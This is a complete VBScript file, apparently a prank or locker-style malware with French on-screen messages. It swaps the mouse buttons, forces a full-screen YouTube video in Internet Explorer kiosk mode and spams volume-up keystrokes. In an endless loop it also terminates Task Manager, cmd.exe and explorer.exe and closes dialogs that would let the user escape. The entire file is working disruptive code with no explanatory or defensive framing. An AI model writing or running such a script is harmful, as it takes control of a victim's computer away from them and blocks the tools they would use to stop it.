sComputerName = "."
Dim oShell : Set oShell = CreateObject("WScript.Shell")
Set objWMIService = GetObject("winmgmts:\\" & sComputerName & "\root\cimv2")
sQuery = "SELECT * FROM Win32_Process"

WScript.Echo "Bonjour trouverez-vous la solution?"

oShell.Run "rundll32.exe user32.dll,SwapMouseButton"

oShell.Run "iexplore.exe -k https://www.youtube.com/embed/49koBNWIuy4/?modestbranding=1&autohide=1&showinfo=0&controls=0&autoplay=1"

Do
For i = 1 To 100
oShell.SendKeys(chr(&hAF))
Next

Set objItems = objWMIService.ExecQuery(sQuery)
For Each objItem In objItems
	  oShell.SendKeys "{F11}"
	
    if objItem.Name = "Taskmgr.exe" OR objItem.Name = "cmd.exe" OR objItem.Name = "explorer.exe" Then
		objItem.Terminate()
	End If
	
	If oShell.AppActivate("Enregistrer la page Web") OR oShell.AppActivate("Options Internet") OR oShell.AppActivate("Choisir un fichier " & Chr(224) & " charger") Then
	  oShell.SendKeys "%{F4}"
	ElseIf oShell.AppActivate("YouTube") Then
	  WScript.Echo "Felicitations!"
	  oShell.Run "explorer.exe"
	  WScript.Quit
	End If
Next


	WScript.Sleep 700
Loop

